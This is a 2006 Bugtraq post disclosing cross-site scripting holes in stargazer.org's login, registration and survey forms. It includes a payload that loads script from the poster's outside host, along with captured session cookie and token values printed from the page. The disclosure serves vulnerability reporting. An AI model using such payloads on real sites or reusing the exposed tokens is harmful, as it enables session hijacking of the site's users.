
Date: 11 Jun 2006 09:07:01 -0000
From: luny@...fucktard.com
To: bugtraq@...urityfocus.com
Subject: Stargazer.org - XSS with Session output


Stargazer.org

Homepage:
http://www.stargazer.org

Effected files:
login box
registration boxes
creating a survey
---------------------------------------

Login box & registration XSS Vuln:

for proof of concept just try adding:

'';!--"<XSS>=&{()}<SCRIPT SRC=http://youfucktard.com/xss.js></SCRIPT>'';!--"<XSS>=&{()}

in the login or registration boxes.

-----------------------------------------

Creating a survey. In the tools section, you can create a survey. Input data isn't sanatized, so a usercould create a XSS example ofattack. For the name of your survey try putting:

Proof of concept:
'';!--"<XSS>=&{()}<SCRIPT SRC=http://youfucktard.com/xss.js></SCRIPT>'';!--"<XSS>=&{()}

The data output on the screen is:
 '';!--"=&{()}This is remote text via xss.js located at youfucktard.com JSESSIONID=0000bZyPd7JGkIqxhgfjnJBYEgn:-1;LtpaToken=zCey/UfagwfE0jhdN9u7ZrwjNrIO7tNF64Dxji+G4NxiFCBlMMHHAvLwCXd5UWfF/Er0tJNjrjWwUowPIYmXO5/R+WRvSiy4o2ngGaRXPjoqNTLBBb9RO9dWvGq5MpDJkX7I8qdd+gV092xtsG90XS+CsXD52nG96y1mWCv5pJK2soDpi+P1WnLc0qWRAs0RNyJqfzvYPU4R64o6aPVEyorn6LS9WRf+VFxbs+IG7x3DGmYvCC2KDRhdvaigQqw1RGBZGm3ptQlwh7vpnNZlqyE1NE1YyoCXzgGdQQm6gX6ZPSgD68NXh/1i59JhyURsQfK7GrkGKglkcTd3yzFcLA=='';!--"=&{()} - www.Stargazer.org/SG-1218 

And at the bottom of the html source is:

[script type="text/javascript" language="Javascript"]
if (typeof writeSTLinksApplet == "function") writeSTLinksApplet("CN=andy dickens,o=sgnorg", "zCey/UfagwfE0jhdN9u7ZrwjNrIO7tNF64Dxji+G4NxiFCBlMMHHAvLwCXd5UWfF/Er0tJNjrjWwUowPIYmXO5/R+WRvSiy4o2ngGaRXPjoqNTLBBb9RO9dWvGq5MpDJkX7I8qdd+gV092xtsG90XS+CsXD52nG96y1mWCv5pJK2soDpi+P1WnLc0qWRAs0RNyJqfzvYPU4R64o6aPVEyorn6LS9WRf+VFxbs+IG7x3DGmYvCC2KDRhdvaigQqw1RGBZGm3ptQlwh7vpnNZlqyE1NE1YyoCXzgGdQQm6gX6ZPSgD68NXh/1i59JhyURsQfK7GrkGKglkcTd3yzFcLA==", true);
[/script]

The server seems to be using IBM's Lotus Collaborative Services. At the top of the html source we find some javascript with referrers to stlinks.js, which stands for sametime links.js and is appeared to be used for building instant messaging applications on Lotus Domino 6.5.1+ servers:

[script type="text/javascript" language="Javascript" src="http://sametime.stargazer.org:80/sametime/stlinks/stlinks.js"][/

script]
[script type="text/javascript" language="Javascript"]
var pacSTServerName = 'sametime.stargazer.org';
var pacSTServerVersion = '3.0';
var pacSTServerHTMLPort = '80';
var pacSTServerProtocol = 'http';
var pacSTServerFullURL = 'http://sametime.stargazer.org:80';
if (typeof setSTLinksURL == "function") setSTLinksURL("http://sametime.stargazer.org:80/sametime/stlinks", "en");
[/script]

More information on the above can be found at: 

http://www-1.ibm.com/support/search.wss?q=stlinks.js&rs=0&lang=en+en&loc=en-US&from=tss&ics=iso-8859-1&cs=utf-8&cc=us

Below are screenshots of the login xss as well as the creating a survey vuln with the output data.

Screenshots:

http://www.youfucktard.com/xsp/sg1.jpg
http://www.youfucktard.com/xsp/sg2.jpg
http://www.youfucktard.com/xsp/sg3.jpg


